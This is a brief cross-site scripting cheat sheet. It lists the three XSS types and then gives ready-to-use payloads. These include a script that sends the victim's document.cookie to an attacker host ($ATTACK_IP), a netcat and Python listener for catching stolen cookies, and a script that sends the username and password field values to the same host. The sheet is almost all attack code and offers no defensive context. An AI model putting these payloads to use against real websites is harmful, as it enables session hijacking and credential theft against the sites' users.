# Cross-Site Scripting (XSS)

## Types
| Type | Description |
|---|---|
| **Reflected XSS** | Payload in URL, reflected immediately |
| **Stored XSS** | Payload saved on server (comments, profiles) |
| **DOM-based XSS** | Client-side JS manipulation |

## Basic Payloads
```javascript
<script>alert('XSS')</script>
<script>document.location='http://$ATTACK_IP/steal.php?c='+document.cookie</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

## Cookie Stealer
```bash
# On attacker machine
nc -lvnp 80
python3 -m http.server 80
```

## Steal Credentials
```javascript
<script>
document.location='http://$ATTACK_IP:80/steal.php?u='+document.getElementById('username').value+'&p='+document.getElementById('password').value
</script>
```
